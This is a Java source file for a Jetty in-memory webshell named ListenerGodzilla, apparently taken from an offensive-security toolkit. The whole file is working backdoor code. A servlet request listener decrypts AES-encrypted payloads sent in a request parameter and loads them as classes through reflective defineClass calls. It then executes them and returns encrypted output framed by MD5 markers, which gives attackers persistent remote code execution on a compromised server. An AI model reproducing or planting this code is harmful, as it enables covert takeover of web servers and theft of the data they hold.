package org.example.jetty.memshell;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author Whoopsunix
 */
public class ListenerGodzilla implements InvocationHandler {
    public static String key; // key
    public static String pass;
    public static String md5 = md5(pass + key);

    public Object invoke(Object proxy, Method method, Object[] args) {
        if (method.getName().equals("requestInitialized")) {
            run(args[0]);
        }
        return null;
    }

    public Object getResponse(Object httpServletRequest) throws Exception{
        return null;
    }

    /**
     * tomcat Listener
     */
//    public Object getResponse(Object httpServletRequest) throws Exception {
//        Object request = getFieldValue(httpServletRequest, "request");
//        Object httpServletResponse = getFieldValue(request, "response");
//        return httpServletResponse;
//    }

    public void run(Object sre) {
        try {
            Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
            Object session = invokeMethod(httpServletRequest, "getSession", new Class[]{}, new Object[]{});

            Object response = getResponse(httpServletRequest);

            String p = (String) invokeMethod(httpServletRequest, "getParameter", new Class[]{String.class}, new Object[]{pass});
            byte[] data = base64Decode(p);
            data = x(data, false);
            Object payload = invokeMethod(session, "getAttribute", new Class[]{String.class}, new Object[]{"payload"});
            if (payload == null) {
                invokeMethod(session, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{"payload", defClass(data)});
            } else {
                invokeMethod(httpServletRequest, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{"parameters", data});
                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                Class cls = (Class) invokeMethod(session, "getAttribute" , new Class[]{String.class}, new Object[]{"payload"});
                Object f = cls.newInstance();
                f.equals(arrOut);
                f.equals(httpServletRequest);
                Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
                invokeMethod(writer, "write", new Class[]{String.class}, new Object[]{md5.substring(0, 16)});
                f.toString();
                invokeMethod(writer, "write", new Class[]{String.class}, new Object[]{base64Encode(x(arrOut.toByteArray(), true))});
                invokeMethod(writer, "write", new Class[]{String.class}, new Object[]{md5.substring(16)});
            }
        } catch (Throwable e) {

        }
    }

    public Class defClass(byte[] classBytes) throws Throwable {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defMethod.setAccessible(true);
        return (Class) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        return method.invoke(obj, args);
    }
}
